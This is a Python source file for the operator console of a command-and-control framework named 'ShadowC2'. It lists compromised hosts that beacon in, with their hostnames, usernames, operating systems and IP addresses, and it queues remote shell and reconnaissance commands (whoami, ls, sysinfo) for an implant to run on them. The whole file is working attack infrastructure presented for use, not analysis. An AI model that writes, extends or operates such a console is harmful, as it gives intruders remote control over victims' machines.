"""
ShadowC2 - Operator CLI (Fixed)
"""

import os
import sys
import sqlite3
import cmd
import uuid
import json
import time
from datetime import datetime
from colorama import init, Fore, Style

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

init(autoreset=True)

class OperatorCLI(cmd.Cmd):
    intro = f"""
{Fore.RED}   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \\
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
{Fore.CYAN}        Command & Control Framework v1.0
{Fore.YELLOW}        Operator Interface
{Style.RESET_ALL}
Type 'help' or '?' to list commands.
"""
    
    prompt = f'{Fore.RED}ShadowC2{Style.RESET_ALL}> '
    
    def __init__(self, db_path="c2_server.db"):
        super().__init__()
        self.db_path = db_path
        
        if not os.path.exists(db_path):
            print(f"{Fore.RED}[!] Database not found: {db_path}")
    
    def do_sessions(self, arg):
        """List active sessions"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM sessions ORDER BY last_seen DESC")
            sessions = cursor.fetchall()
            
            if not sessions:
                print(f"{Fore.YELLOW}[*] No active sessions")
                conn.close()
                return
            
            print(f"\n{Fore.CYAN}Active Sessions:")
            print("=" * 130)
            print(f"{'ID':<3} {'Session ID':<38} {'Hostname':<15} {'Username':<12} {'OS':<25} {'IP':<15} {'Last Seen':<15}")
            print("=" * 130)
            
            for idx, session in enumerate(sessions, 1):
                # Unpack all 9 columns
                session_id, hostname, username, os_name, arch, ip, first_seen, last_seen, status = session
                
                time_diff = datetime.now().timestamp() - last_seen
                if time_diff < 120:
                    last_seen_str = f"{int(time_diff)}s ago"
                    color = Fore.GREEN
                elif time_diff < 600:
                    last_seen_str = f"{int(time_diff/60)}m ago"
                    color = Fore.YELLOW
                else:
                    last_seen_str = f"{int(time_diff/3600)}h ago"
                    color = Fore.RED
                
                print(f"{color}[{idx}] {session_id:<36} {hostname:<15} {username:<12} {os_name:<25} {ip:<15} {last_seen_str:<15}{Style.RESET_ALL}")
            
            print("=" * 130)
            print(f"{Fore.GREEN}Total: {len(sessions)} session(s)\n")
            
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_interact(self, arg):
        """Interact with a session - Usage: interact <session_number>"""
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: interact <session_number>")
            return
        
        try:
            session_num = int(arg)
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT session_id, hostname FROM sessions ORDER BY last_seen DESC LIMIT ? OFFSET ?", (1, session_num - 1))
            result = cursor.fetchone()
            
            if not result:
                print(f"{Fore.RED}[!] Invalid session number")
                conn.close()
                return
            
            session_id, hostname = result
            
            print(f"{Fore.GREEN}[+] Interacting with session {session_num} ({hostname})")
            print(f"{Fore.YELLOW}[*] Type 'back' to return to main menu\n")
            
            session_cli = SessionCLI(self.db_path, session_id, hostname)
            session_cli.cmdloop()
            
            conn.close()
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid session number")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_stats(self, arg):
        """Show C2 statistics"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
            active_sessions = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM sessions")
            total_sessions = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM commands")
            total_commands = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM commands WHERE status = 'completed'")
            completed_commands = cursor.fetchone()[0]
            
            print(f"\n{Fore.CYAN}C2 Server Statistics:")
            print("=" * 50)
            print(f"{Fore.GREEN}Active Sessions:    {active_sessions}")
            print(f"Total Sessions:     {total_sessions}")
            print(f"Total Commands:     {total_commands}")
            print(f"Completed Commands: {completed_commands}")
            print("=" * 50 + "\n")
            
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_exit(self, arg):
        """Exit the operator interface"""
        print(f"{Fore.YELLOW}[*] Exiting...")
        return True
    
    def do_quit(self, arg):
        """Exit"""
        return self.do_exit(arg)


class SessionCLI(cmd.Cmd):
    
    def __init__(self, db_path, session_id, hostname):
        super().__init__()
        self.db_path = db_path
        self.session_id = session_id
        self.hostname = hostname
        self.prompt = f'{Fore.RED}(session {hostname}){Style.RESET_ALL}> '
    
    def queue_command(self, command, args=None):
        """Queue command"""
        try:
            from common.protocol import CommandMessage
            
            cmd_msg = CommandMessage(
                session_id=self.session_id,
                command=command,
                args=args or []
            )
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO commands (command_id, session_id, command, timestamp, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                cmd_msg.msg_id,
                self.session_id,
                json.dumps(cmd_msg.to_dict()),
                int(time.time()),
                "queued"
            ))
            
            conn.commit()
            conn.close()
            
            print(f"{Fore.GREEN}[+] Command queued: {command}")
            print(f"{Fore.YELLOW}[*] Wait ~60s for beacon, then check server terminal for output")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_shell(self, arg):
        """Execute shell command - Usage: shell <command>"""
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: shell <command>")
            return
        self.queue_command("shell", [arg])
    
    def do_whoami(self, arg):
        """Get current username"""
        self.queue_command("whoami")
    
    def do_hostname(self, arg):
        """Get hostname"""
        self.queue_command("hostname")
    
    def do_pwd(self, arg):
        """Print working directory"""
        self.queue_command("pwd")
    
    def do_ls(self, arg):
        """List directory"""
        path = arg if arg else "."
        self.queue_command("ls", [path])
    
    def do_sysinfo(self, arg):
        """Get system information"""
        self.queue_command("sysinfo")
    
    def do_back(self, arg):
        """Return to main menu"""
        return True


if __name__ == "__main__":
    cli = OperatorCLI()
    try:
        cli.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Exiting...")
